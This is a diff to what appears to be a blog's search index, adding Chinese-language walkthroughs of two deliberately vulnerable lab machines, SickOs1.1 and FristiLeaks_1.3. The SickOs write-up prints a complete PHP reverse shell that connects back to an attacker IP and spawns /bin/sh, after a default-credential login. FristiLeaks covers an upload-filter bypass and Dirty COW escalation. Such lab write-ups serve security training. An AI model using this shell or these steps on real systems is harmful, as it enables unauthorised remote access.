@@ -12102,6 +12102,85 @@
 ]]></content>
   </entry>
   <entry>
+    <title>SickOs1.1</title>
+    <url>/2020/10/17/oiegm9/</url>
+    <content><![CDATA[<p>nmap 扫描一下端口</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602932641316-1a972216-9af1-48f2-8c05-766a681fbfc4.png#align=left&display=inline&height=447&margin=%5Bobject%20Object%5D&name=image.png&originHeight=629&originWidth=885&size=143758&status=done&style=none&width=629" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>3128 端口开着一个代理服务，使用 nmap 的代理功能对靶机的本机进行了扫描<br><code>nmap --proxy http://192.168.17.137 -p- -A 127.0.0.1</code></p>
+<p>使用它提供的代理去访问一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602933839718-9e783f4e-105b-48c0-9cb3-c028f9f2fcc8.png#align=left&display=inline&height=286&margin=%5Bobject%20Object%5D&name=image.png&originHeight=365&originWidth=342&size=26035&status=done&style=stroke&width=268" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>访问 robots 得到</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602933899961-8ca92756-009d-4c62-90c1-4c694d954d65.png#align=left&display=inline&height=305&margin=%5Bobject%20Object%5D&name=image.png&originHeight=379&originWidth=374&size=33064&status=done&style=stroke&width=301" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>访问是一个 cms</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602934111140-0d6a349b-9250-4797-9560-4ad66e1b2791.png#align=left&display=inline&height=496&margin=%5Bobject%20Object%5D&name=image.png&originHeight=991&originWidth=1612&size=131488&status=done&style=stroke&width=806" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>后台登录页面：/?/admin/login</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602934342984-9bc39a7e-9efc-4394-82d6-921db2f4d7c4.png#align=left&display=inline&height=373&margin=%5Bobject%20Object%5D&name=image.png&originHeight=692&originWidth=1217&size=88997&status=done&style=none&width=656" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>admin:admin 登录成功<br>可以写文件啥的，写个 php 的反弹 shell</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = <span class="string">'192.168.17.1'</span>;</span><br><span class="line">$port = <span class="string">'6666'</span>;</span><br><span class="line">$sock = fsockopen($ip, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; $sock,</span><br><span class="line">    <span class="number">1</span> =&gt; $sock,</span><br><span class="line">    <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">'/bin/sh'</span>,$descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602934977997-651ec3cc-0a64-4235-a3e1-db5a7c1c15a7.png#align=left&display=inline&height=339&margin=%5Bobject%20Object%5D&name=image.png&originHeight=621&originWidth=1067&size=196083&status=done&style=stroke&width=582" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>在 config.php 中找到了数据库的用户名与密码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602935340243-f2d46f18-9b6a-4b3a-b0fa-cf7f15202e3a.png#align=left&display=inline&height=337&margin=%5Bobject%20Object%5D&name=image.png&originHeight=539&originWidth=910&size=300929&status=done&style=none&width=569" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>用那个密码试一下，登录用户：sickos，同时 <code>sudo -s</code> 直接拿到 root 权限</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602935470974-09b35df4-50b5-44ec-8618-ed16028d62e8.png#align=left&display=inline&height=387&margin=%5Bobject%20Object%5D&name=image.png&originHeight=773&originWidth=1474&size=1329593&status=done&style=none&width=737" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+]]></content>
+  </entry>
+  <entry>
     <title>AI Web 1.0</title>
     <url>/2020/06/22/olf7wy/</url>
     <content><![CDATA[<p>这次给的是一个 vmware 的虚拟机，直接用 vmware 打开就行，然后 arp-scan -l 找一下 ip</p>
@@ -18361,6 +18440,87 @@
 
 <p>exp</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = angr.Project(<span class="string">"./pwn"</span>)</span><br><span class="line">state = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(state)</span><br><span class="line">res = sm.explore(find=<span class="number">0x08048817</span>,avoid=<span class="number">0x0804882B</span>)</span><br><span class="line">print(res.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
+]]></content>
+  </entry>
+  <entry>
+    <title>FristiLeaks_1.3</title>
+    <url>/2020/10/21/vtgisq/</url>
+    <content><![CDATA[<p>要把 MAC 地址改为 08:00:27:A5:A6:76</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1603276965506-e5b69b3d-0217-479d-a85c-75dfaf647565.png#align=left&display=inline&height=431&margin=%5Bobject%20Object%5D&name=image.png&originHeight=612&originWidth=886&size=137279&status=done&style=none&width=624" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>访问 80 端口，nmap 的结果上有个 robots.txt，挨个访问里面的网址没啥发现<br>扫描目录的结果：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1603277117844-e33d3308-aae9-4a7b-a6b9-1de1898b1e89.png#align=left&display=inline&height=172&margin=%5Bobject%20Object%5D&name=image.png&originHeight=211&originWidth=434&size=33034&status=done&style=stroke&width=353" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p><a href="http://192.168.17.139/fristi/" target="_blank" rel="noopener">http://192.168.17.139/fristi/</a> 是一个登录页面</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1603277163102-7ebf34c3-8ae5-492d-8a59-dacce9a3e7bd.png#align=left&display=inline&height=418&margin=%5Bobject%20Object%5D&name=image.png&originHeight=836&originWidth=822&size=269300&status=done&style=stroke&width=411" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>注释里面有串 base64，解出来 png 开头，应该是个图片</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1603277269316-22aaa0de-fd05-409e-834e-cd764cedcd72.png#align=left&display=inline&height=256&margin=%5Bobject%20Object%5D&name=image.png&originHeight=452&originWidth=1260&size=91222&status=done&style=stroke&width=715" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>kali 下直接 <code>base64 -d flag &gt; 1.png</code></p>
+<p>得到一张图片，内容是：keKkeKKeKKeKkEkkEk</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1603277725733-d00f5885-770d-40b4-88d7-b2010383d2aa.png#align=left&display=inline&height=82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=163&originWidth=830&size=47904&status=done&style=stroke&width=415" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>同时注释中还有这么一段</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1603277811311-18ca785c-4b3a-41af-ae78-7275cd1d8b0f.png#align=left&display=inline&height=84&margin=%5Bobject%20Object%5D&name=image.png&originHeight=116&originWidth=835&size=6598&status=done&style=stroke&width=613" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>试一下 eezeepz::keKkeKKeKKeKkEkkEk 登录一下<br>登录成功！有一个上传文件的地方</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1603277893559-bdf0ac05-1b16-4288-9e21-04cf98e3b57c.png#align=left&display=inline&height=53&margin=%5Bobject%20Object%5D&name=image.png&originHeight=80&originWidth=482&size=5527&status=done&style=stroke&width=321" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>只能上传 png、jpg、gif</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1603278793678-7dfd36a1-ffbb-486a-a236-34262a6fb34b.png#align=left&display=inline&height=257&margin=%5Bobject%20Object%5D&name=image.png&originHeight=399&originWidth=805&size=36459&status=done&style=stroke&width=519" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>可以利用 apache 的解析漏洞传一个 xxx.php.jpg 的上去</p>
+<p>然后没找到什么东西了</p>
+<p>脏牛提权</p>
 ]]></content>
   </entry>
   <entry>
